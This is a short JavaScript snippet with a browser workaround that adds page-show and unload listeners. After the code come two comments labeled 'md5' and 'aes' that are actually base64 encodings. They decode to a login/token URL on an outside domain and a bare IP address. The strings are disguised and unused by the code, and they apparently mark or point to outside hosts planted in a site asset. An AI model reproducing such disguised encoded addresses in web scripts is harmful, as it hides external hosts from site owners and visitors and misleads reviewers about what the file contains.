if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cubGxubW4uY24vaW5kZXgvbG9naW4vbG9naW4vdG9rZW4vNzFhMjQ0NDI1OTc0NmZkMWJkMDMyZmVlMjc5MjkzMzMuaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/